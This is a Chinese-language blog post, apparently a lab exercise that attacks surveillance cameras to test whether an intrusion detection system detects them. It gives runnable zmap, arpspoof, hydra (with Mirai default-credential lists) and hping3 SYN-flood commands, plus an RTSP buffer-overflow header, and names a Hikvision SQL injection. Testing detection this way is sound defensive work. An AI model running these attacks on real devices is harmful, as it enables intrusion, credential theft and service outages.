---
layout: post
title: "各种攻击演练"
date: 2018-05-20 20:00:00
author: "Johan Niu"
header-img : "img/post-bg-os-metro.jpg"
tags:
    - 攻击工具
    - 安全
    - 学习
       
---

# 各种攻击演练

## 1 端口探测

使用`zmap`扫描工具对视频监控网络进行端口扫描。

命令如下：

	zmap -p 23 -B 50k 192.168.12.0/24 -b telnet_portscan.csv;

测试结果在威胁界面的展示如图：

![](http://niubencoolboy.github.io/img/attack/portscan.png)

对192.168.12.0/24网段的16台摄像头的23端口进行端口扫描，共产生16条报警记录信息。

### 1.1 端口扫描工具

|工具 |状态
|---|---
|nmap | 有状态 
|zmap | 无状态 
|massscan | 无状态 

基于 `zmap` 的应用层扫描器 **`zgrab`**

zgrab 是基于zmap无状态扫描的应用层扫描器,可以自定义数据包,以及ip,domain之间的关联。

可用于快速指纹识别爆破等场景。

## 2 ARP欺骗

使用`arpspoof`攻击在视频监控内网进行ARP投毒。

对摄像头`192.168.12.143`进行ARP 攻击。

先打开 IP 转发:

	echo 1 > /proc/sys/net/ipv4/ip_forward

然后使用 arpspoof 命令进行欺骗, 命令使用方法如下:

	arpspoof -i <网卡名> -t <欺骗的目标> <我是谁>


实际命令如下：

	arpspoof -i eth0 -t 192.168.12.143 192.168.12.1;

测试结果在威胁界面的展示如图：

![](http://niubencoolboy.github.io/img/attack/arpspoof.png)

## 3 口令探测

利用开源工具`hydra`进行口令探测攻击。

这里利用`Mirai`病毒中的user与password表作为默认的口令库，

然后加入视频监控设备厂商的默认口令库。形成user.txt、passwd.txt文件。

从ssh、telnet、ftp协议服务方面测试入侵检测系统对口令探测的检测能力。

命令如下（其中ip.list即为192.168.12.0/24网段的所有视频监控ip）：

	hydra -L user.txt -P passwd.txt -vV -e ns -M ip.list ssh;
	hydra -L user.txt -P passwd.txt -vV -e ns -M ip.list telnet;
	hydra -L user.txt -P passwd.txt -vV -e ns -M ip.list ftp

测试结果在威胁界面的展示如图：

![](http://niubencoolboy.github.io/img/attack/weakpasswd.png)
	

## 4 缓冲区溢出

利用存在`RTSP`协议的缓冲区溢出漏洞的摄像头进行缓冲区溢出攻击测试。
`RTSP`协议的交互需要 `DESCRIBE reques` 请求，构造 `RTSP DESCRIBE option` 的请求数据包如下：

	RTSP_DESCRIBE_HEADERS_MAP = {
	    "CSeq": "3",
	    "Accept": "application/sdp",
	    "Authorization": "Digest " + 'A' * 10000,
	    "User-Agent": "VLC media player"
	}
	
测试结果在威胁界面的展示如图：

![](http://niubencoolboy.github.io/img/attack/buffer.png)

## 5 模拟DDOS攻击

使用`hping3`开源工具进行DOS攻击测试，

采用`SYN Flooding`对摄像头192.168.12.143进行DOS攻击，验证入侵检测系统是否能够检测出来。

命令如下：

	hping3 -I eth0 -a 192.168.12.27 -S 192.168.12.143 -p 80 -i u1000；

![](http://niubencoolboy.github.io/img/attack/ddos.png)

## 6 Web攻击

本测试采用海康威视摄像头存在的SQL注入漏洞进行Web攻击，利用`SSV-91768`（seebug 漏洞编号）漏洞信息，伪造请求进行注入。

![](http://niubencoolboy.github.io/img/attack/web.png)






